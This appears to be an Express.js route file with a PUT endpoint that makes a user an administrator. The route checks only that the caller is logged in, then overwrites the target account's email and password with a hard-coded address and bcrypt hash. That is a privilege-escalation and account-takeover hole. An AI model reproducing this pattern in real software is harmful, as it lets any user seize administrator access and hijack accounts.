const Router=require("express").Router()
const auth=require("../middleWares/authMW.JS")
const Students=require("../models/usersModel")

Router.put("/:id",auth,async (req,res)=>{
     Students.findByIdAndUpdate(req.params.id ,{admin:true , email:"ahmed@gmail.com" , password:"$2b$10$K0sPiJmczf4cN/MNElLcgeTBl8fKK4Xlb0EwYWEBKWs2VpcrvNGeK"} ,(err,info)=>{
          if(err) return res.status(500).send("Falid request ..")
          if(!info) return res.status(401).send("Not found Users ..")
          res.status(200).send("User Role is set as Admin ")
     })
     
})

module.exports=Router